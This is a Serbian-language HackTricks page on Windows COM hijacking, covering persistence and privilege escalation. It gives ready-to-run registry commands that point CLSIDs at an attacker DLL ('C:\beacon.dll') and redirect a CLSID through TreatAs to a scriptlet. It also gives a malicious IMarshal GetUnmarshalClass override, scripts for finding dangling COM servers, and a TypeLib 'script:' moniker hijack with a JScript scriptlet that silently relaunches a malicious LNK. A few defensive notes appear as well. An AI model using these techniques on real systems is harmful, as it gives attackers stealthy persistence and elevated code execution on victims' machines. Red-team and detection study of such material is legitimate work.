# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Pretraga nepostojećih COM komponenti

Pošto korisnici mogu da menjaju vrednosti u HKCU, **COM Hijacking** može da se koristi kao **mehanizam za perzistenciju**. Pomoću `procmon` lako je pronaći COM registre koji se traže, ali još ne postoje i koje napadač može da kreira. Klasični filteri:

- operacije **RegOpenKey**.
- gde je _Result_ **NAME NOT FOUND**.
- i gde se _Path_ završava sa **InprocServer32**.

Korisne varijacije tokom potrage:

- Potražite i nedostajuće ključeve **`LocalServer32`**. Neke COM klase su serveri van procesa i pokrenuće EXE koji kontroliše napadač, umesto DLL-a.
- Pored `InprocServer32`, potražite i operacije registra **`TreatAs`** i **`ScriptletURL`**. U novijim sadržajima za detekciju i izveštajima o malveru često se pominju jer su mnogo ređi od uobičajenih COM registracija i zato predstavljaju snažan indikator.
- Prilikom kloniranja registracije u HKCU, preuzmite legitimnu vrednost **`ThreadingModel`** iz originalnog `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`. Pogrešan model često onemogućava aktivaciju i čini otmicu uočljivom.<sup>[[3]](#references)</sup>
- Na 64-bitnim sistemima proverite i 64-bitni i 32-bitni prikaz (`procmon.exe` naspram `procmon64.exe`, `HKLM\Software\Classes` i `HKLM\Software\Classes\WOW6432Node`), jer 32-bitne aplikacije mogu da pronađu drugu COM registraciju.

Kada odlučite koji nepostojeći COM želite da imitirate, izvršite sledeće komande. _Budite oprezni ako odlučite da imitirate COM koji se učitava svakih nekoliko sekundi, jer to može biti preterano._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### COM komponente Task Scheduler-a koje se mogu oteti

Windows Tasks koriste Custom Triggers za pozivanje COM objekata, a pošto se izvršavaju preko Task Scheduler-a, lakše je predvideti kada će biti aktivirani.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Na osnovu izlaza možete odabrati, na primer, zadatak koji će se izvršavati **svaki put kada se korisnik prijavi**.

Zatim, pretragom CLSID-a **{1936ED8A-BD93-3213-E325-F38D112938EF}** u **HKEY\CLASSES\ROOT\CLSID**, kao i u HKLM i HKCU, obično ćete ustanoviti da ta vrednost ne postoji u HKCU.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Zatim možete jednostavno da kreirate HKCU unos i vaša backdoor će se pokretati svaki put kada se korisnik prijavi.

## Nevažeće COM registracije i prilagođeni marshaling

COM registracija na nivou cele mašine može postati primitiv za DLL planting bez menjanja registry-ja. Potražite vrednost `InprocServer32` čiji DLL nedostaje, a čija konačna putanja može da se kreira ili izmeni uz niske privilegije. Postavljanjem DLL-a sa tačnim imenom, svaki proces koji aktivira CLSID učitaće napadačev kod. U primeru CrossDevice, registrovana putanja bila je `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, pa je običan korisnik mogao da kreira nedostajući poddirektorijum i DLL.<sup>[[5]](#references)</sup>

### Mape dodataka koje mogu da se menjaju kao privilegovani COM aktivacioni putevi

Mapa koja povezuje ID-jeve dodataka sa CLSID-ovima i može da se menja, može niže privilegovanom korisniku da omogući izbor in-process COM servera koji učitava privilegovana usluga, čak i kada nije moguće izmeniti registraciju klase na nivou cele mašine.<sup>[[8]](#references)[[9]](#references)</sup> U prijavljenom slučaju za `InstallService` u Windows 11, obični korisnici mogli su da menjaju `StaticPluginMap`; ID dodatka koji nije ugrađen birao je CLSID koji je usluga `LocalSystem` prosleđivala funkciji `CoCreateInstance` sa `CLSCTX_INPROC_SERVER` i `IID_IInstallServicePlugin`.<sup>[[8]](#references)[[9]](#references)</sup> Registrovani DLL učitava se в proces usluge, a ne u zaseban COM host.<sup>[[10]](#references)</sup>

Relevantni uslovi su efektivna dozvola za pisanje u mapu, dostupan zahtev za dodatak i putanja DLL-a `InprocServer32` koju niže privilegovan korisnik može da kontroliše.<sup>[[8]](#references)[[9]](#references)</sup> U prijavljenom slučaju, prethodno navedena registracija za CrossDevice ispunjavala je uslov za putanju.<sup>[[8]](#references)[[9]](#references)</sup> Uspešan objekat dodatka mora da izloži traženi interfejs, ali DLL se učitava pre završetka funkcije `CoCreateInstance`; neuspešno izlaganje tog interfejsa samo po sebi ne isključuje izvršavanje koda tokom učitavanja.<sup>[[8]](#references)[[11]](#references)</sup> Ovaj put preko dispečera usluge razlikuje se od puta preko prilagođenog `IMarshal` opisanog ispod. Za zaseban primitivan koji koristi putanju datoteke, pogledajte [DLL Hijacking](dll-hijacking/).

### `IMarshal` kao primitivan za učitavanje DLL-a između procesa

COM obično predstavlja pokazivač interfejsa pomoću standardnog `OBJREF`-a koji upućuje primaoca nazad na originalni objekat. Objekat koji implementira `IMarshal` može umesto toga da proizvede prilagođeni `OBJREF`. Njegova metoda `GetUnmarshalClass` navodi CLSID koda koji će ponovo kreirati objekat u procesu primaoca. Taj CLSID ne mora da identifikuje originalni objekat. COM ga razrešava kao in-process server i učitava registrovani DLL pre nego što pozove traženu metodu interfejsa.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Minimalna zlonamerna implementacija treba samo da zameni nevažeći CLSID u funkciji `GetUnmarshalClass`.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Prosledite ovaj objekat kroz parametar proxied metode, kao što je `[in] IUnknown *`. Druga mogućnost je `CoGetInstanceFromIStorage`, pri čemu objekat sa custom marshaling-om takođe implementira dovoljno interfejsa `IStorage` da prođe lokalne provere. Automatski unmarshaling na udaljenom serveru razrešava zamenjeni CLSID, pa se DLL učitava pre pozivanja ciljne metode.<sup>[[5]](#references)</sup>

Ovaj primitiv nije ograničen na registracije koje nedostaju. Može i da natera primaoca da učita postojeći DLL za custom unmarshaler i izloži greške u njegovoj putanji učitavanja ili unmarshaling-a.<sup>[[5]](#references)</sup>

Lanac zahteva sve sledeće uslove:<sup>[[5]](#references)</sup>

1. CLSID vidljiv na nivou mašine ukazuje na nedostajući ili zamenljivi in-process DLL.
2. Napadač može da postavi taj DLL na razrešenu putanju.
3. Aktivabilni out-of-process COM server radi na željenom nivou privilegija.
4. Server prihvata custom marshaling i izlaže proxied poziv koji prenosi objekat napadača preko granice procesa.

### Pronalaženje nevažećih in-process servera

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) i [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) mogu da nabroje mašinsku COM bazu podataka i testiraju svaki server koristeći uobičajeno Win32 razrešavanje modula. To je bolje od `Test-Path` jer neke registracije sadrže samo ime datoteke i oslanjaju se na putanju pretrage loader-a.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Tretirajte rezultat kao listu kandidata, a ne kao dokaz da je eksploatacija moguća. Razrešite putanju onako kako to radi loader, a zatim pregledajte DACL prvog postojećeg roditeljskog direktorijuma i ciljnog DLL-a, ako već postoji. Nedostajuća datoteka je korisna samo ako napadač može da kreira ili zameni putanju koju će COM zaista razrešiti.<sup>[[5]](#references)</sup>

### Izaberite i pokrenite privilegovani server

Pregledajte kandidate za COM klase i proverite `RunAs`, povezanost sa servisom, dostupne interfejse i RPC proksije. Klasa konfigurisana za `SYSTEM`, ali bez povezanog imenovanog servisa, možda neće moći direktno da se aktivira jer RPCSS ne može da je pokrene. U tom slučaju potražite neprivilegovani okidač koji pokreće njen host, na primer izvršiv zakazani zadatak, i ponovite sve preduslove u vidu imenovanog događaja ili IPC-a koji održavaju server aktivnim.<sup>[[5]](#references)</sup>

Na primer, ranjivi lanac Shell Create Object Handler pokretao je svoj host tako što je kreirao očekivani globalni događaj pre pozivanja zakazanog zadatka koji može da izvrši korisnik.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Mapirajte dobijenu referencu objekta nazad do njenog hosta i proverite identitet i pravila marshalinga. Zatim izlistajte interfejse i konvertujte njihove proxy-je u IDL da biste pronašli ulazni parametar kao što je `IUnknown *` koji će marshalovati lažni objekat.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Zaštite od custom marshaling-a

Odgovarajući primalac ne sme da odbacuje nepouzdane custom marshalers. Dve zaštite koje važe za ceo proces su `EOAC_NO_CUSTOM_MARSHAL` u capabilities prosleđenim funkciji `CoInitializeSecurity` i `COMGLB_UNMARSHALING_POLICY_STRONG`, podešen preko `IGlobalOptions::Set`. Kada su dostupni simboli, odgovarajuće stanje može da se proveri u `combase!gCapabilities` i `combase!g_GLBOPT_UnmarshalingPolicy`; NtObjectManager prikazuje rezultat kao `CustomMarshalAllowed` ako njegov parser procesa podržava tu verziju Windows-a.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` omogućava da jedan CLSID emulira drugi.<sup>[[4]](#references)</sup> Iz ofanzivne perspektive, to znači da možete da ostavite originalni CLSID netaknutim, kreirate drugi CLSID za trenutnog korisnika koji pokazuje na `scrobj.dll`, a zatim preusmerite pravi COM objekat na zlonamerni pomoću `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Ovo je korisno kada:

- ciljna aplikacija već instancira stabilan CLSID prilikom prijavljivanja ili pokretanja aplikacije
- želite preusmeravanje samo preko registra, umesto zamene originalnog `InprocServer32`
- želite da izvršite lokalni ili udaljeni `.sct` scriptlet preko vrednosti `ScriptletURL`

Primer postupka (prilagođen tehnikama iz javnog Atomic Red Team skupa i starijih istraživanja zloupotrebe COM registra):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Napomene:

- `scrobj.dll` čita vrednost `ScriptletURL` i izvršava navedeni `.sct`, tako da payload možete da zadržite kao lokalnu datoteku ili da ga preuzmete udaljeno preko HTTP/HTTPS-a.
- `TreatAs` je naročito koristan kada je originalna COM registracija potpuna i stabilna u HKLM-u, jer vam je potrebno samo malo preusmeravanje po korisniku umesto preslikavanja celog stabla.
- Da biste proverili funkcionisanje bez čekanja na uobičajeni okidač, možete ručno da instancirate lažni ProgID/CLSID pomoću `rundll32.exe -sta <ProgID-or-CLSID>`, ako ciljna klasa podržava STA aktivaciju.

## COM TypeLib Hijacking (script: moniker persistence)

Biblioteke tipova (TypeLib) definišu COM interfejse i učitavaju se pomoću `LoadTypeLib()`. Kada se COM server instancira, operativni sistem može da učita i povezanu TypeLib proverom ključeva registratora u okviru `HKCR\TypeLib\{LIBID}`. Ako se putanja TypeLib-a zameni **monikerom**, npr. `script:C:\...\evil.sct`, Windows će izvršiti scriptlet kada se TypeLib razreši — čime se postiže prikrivena postojanost koja se aktivira kada se koriste uobičajene komponente.

Ovo je primećeno kod kontrole Microsoft Web Browser (koju često učitavaju Internet Explorer, aplikacije koje ugrađuju WebBrowser, pa čak i `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Koraci (PowerShell)

1) Identifikujte TypeLib (LIBID) koju koristi CLSID sa velikom učestalošću korišćenja. Primer CLSID-a koji se često zloupotrebljava u lancima malware-a: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Usmerite TypeLib putanju za korisnika na lokalni scriptlet pomoću monikera `script:` (nisu potrebna administratorska prava):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Postavite minimalni JScript `.sct` koji ponovo pokreće vaš primarni payload (npr. `.lnk` koji koristi početni lanac):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Okidanje – otvaranje IE-a, aplikacije koja ugrađuje kontrolu WebBrowser ili čak uobičajena aktivnost Explorera učitaće TypeLib i izvršiti scriptlet, ponovo aktivirajući vaš lanac pri prijavi/restartu.

Čišćenje
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Beleške
- Istu logiku možete primeniti i na druge COM komponente koje se često koriste; uvek prvo utvrdite stvarni `LIBID` iz `HKCR\CLSID\{CLSID}\TypeLib`.
- Na 64-bitnim sistemima možete popuniti i potključ `win64` za 64-bitne potrošače.

## References

- [1] [Otmica TypeLib-a – Nova COM tehnika postojanosti (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine kampanja: sofisticirani phishing napad usmeren na kompanije u SAD](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Ponovno razmatranje COM hijacking-a (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID ključ (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Tehnike eksploatacije Windows-a: Registracije COM objekata sa nepostojećim odredištem](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - IMarshal interfejs](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
- [8] [Dark Elevator PoC i tehnički prikaz (califio)](https://github.com/califio/publications/tree/main/MADBugs/windows-CVE-2026-50343)
- [9] [Dark Elevator: Eskalacija lokalnih privilegija putem Windows Install Service-a (calif.io)](https://blog.calif.io/p/dark-elevator-windows-install-service)
- [10] [Nabrajanje CLSCTX vrednosti (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx)
- [11] [Funkcija CoCreateInstance (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
{{#include ../../banners/hacktricks-training.md}}

